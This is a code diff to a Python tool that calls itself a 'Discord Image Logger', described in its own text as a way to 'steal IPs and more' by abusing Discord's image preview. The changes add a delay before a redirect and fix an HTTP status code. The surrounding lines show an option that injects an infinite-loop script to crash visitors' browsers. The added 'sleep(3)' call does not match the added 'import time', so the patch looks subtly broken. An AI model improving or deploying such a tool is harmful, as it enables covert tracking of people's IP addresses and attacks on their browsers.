@@ -15,6 +15,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import time
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -256,8 +257,9 @@ height: 100vh;
                 if config["crashBrowser"]:
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                 if config["redirect"]["redirect"]:
+                    sleep(3)
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(2000)
+                self.send_response(200)
                 self.send_header('Content-type', datatype)
                 self.end_headers()
 
